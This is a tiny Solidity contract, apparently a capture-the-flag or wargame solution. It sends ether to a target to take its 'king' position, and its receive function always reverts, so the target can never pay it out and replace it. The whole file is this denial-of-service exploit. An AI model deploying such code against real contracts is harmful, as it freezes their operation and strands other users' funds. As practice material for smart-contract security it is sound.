// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess(bytes data);
error AlwaysKing();

contract King {
    function pwn(address payable target) external payable {
        (bool success, bytes memory data) = target.call{value: msg.value}("");
        if (!success) revert CallNotSuccess(data);
    }

    receive() external payable {
        revert AlwaysKing();
    }
}
